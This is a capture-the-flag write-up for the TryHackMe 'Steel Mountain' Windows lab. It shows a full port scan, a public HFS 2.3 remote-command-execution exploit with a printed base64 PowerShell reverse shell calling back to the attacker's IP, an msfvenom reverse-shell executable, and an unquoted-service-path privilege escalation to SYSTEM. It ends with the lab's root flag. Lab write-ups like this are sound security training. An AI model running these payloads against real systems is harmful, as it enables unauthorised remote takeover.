---
categories: [TryHackMe]
tags: [ Windows, HFS, Unquoted_Service_Path, Public Exploit, PrivEsc]
img_path: /assets/images/
image:
  path: https://miro.medium.com/v2/resize:fit:1400/0*V8ENEIkiF6Ym5wbv.png
  width: "1200"
  height: "630"
  alt: Windows Easy Level Machine 🎯
---
## Port Scan Results ⤵️
```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/steel_mountain]
└─$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.161.188 -Pn
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-04 10:35 IST
Nmap scan report for 10.10.161.188
Host is up (0.17s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesnt have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2024-03-04T05:22:19+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2024-03-03T05:04:55
|_Not valid after:  2024-09-02T05:04:55
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2024-03-04T05:22:13+00:00
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49169/tcp open  msrpc              Microsoft Windows RPC
49170/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-03-04T05:22:15
|_  start_date: 2024-03-04T05:04:45
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:31:ea:79:46:4d (unknown)
```
{: .nolineno}
## Web Enumeration ⤵️

while checking port 8080 I got this <mark style="background: #ADCCFFA6;">HFS file server</mark> site and its version noticeable ->
![Image](Pasted%20image%2020240304120004.png)
I enumerated web file serve version on web and got this exploit related to it ->
[HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)](https://www.exploit-db.com/exploits/49584)

```powershell
┌──(kali㉿kali)-[~/Downloads/Tryhackme/steel_mountain]
└─$ python3 exploit2.py                                                  

Encoded the command in base64 format...

Encoded the payload and sent a HTTP GET request to the target...

Printing some information for debugging...
lhost:  10.11.75.200
lport:  4444
rhost:  10.10.161.188
rport:  8080
payload:  exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAxAC4ANwA1AC4AMgAwADAAIgAsADQANAA0ADQAKQA7ACAAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAIABbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ACAAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsADAALAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkAOwAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACAAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

Listening for connection...
listening on [any] 4444 ...
connect to [10.11.75.200] from (UNKNOWN) [10.10.161.188] 49297

PS C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> whoami
steelmountain\bill
PS C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> hostname
steelmountain
PS C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> 
```
{: .nolineno}

I uploaded winpeas.exe Tool to enumerate further and I got some info 🔽
![Image](Pasted%20image%2020240304104921.png)
I also got this <mark style="background: #D2B3FFA6;">unquoted service path</mark> vulnerability so lets exploit that ->
![Image](Pasted%20image%2020240304105129.png)

I created the Reverse shell payload that will replace the Advanced Systemcare to Advanced.exe and it will execute as Administrator ->
```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/steel_mountain]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.75.200 LPORT=445 -e x86/shikata_ga_nai -f exe -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: Advanced.exe
```
{: .nolineno}
Lets upload it now ->
![Image](Pasted%20image%2020240304115351.png)
I got response on my <mark style="background: #FF5582A6;">netcat</mark> listener on port 445 ->
```powershell
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator>tree /f /a
tree /f /a
Folder PATH listing
Volume serial number is 0000000A 2E4A:906A
C:.
+---Contacts
+---Desktop
|       activation.ps1
|       root.txt
|       
+---Documents
+---Downloads
+---Favorites
|   |   Bing.url
|   |   
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|       RecentPlaces.lnk
|       
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos

C:\Users\Administrator>type Desktop\root.txt
type Desktop\root.txt
9af5f314f57607c00fd09803a587db80
C:\Users\Administrator>
```
{: .nolineno}
I am Administrator Now !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }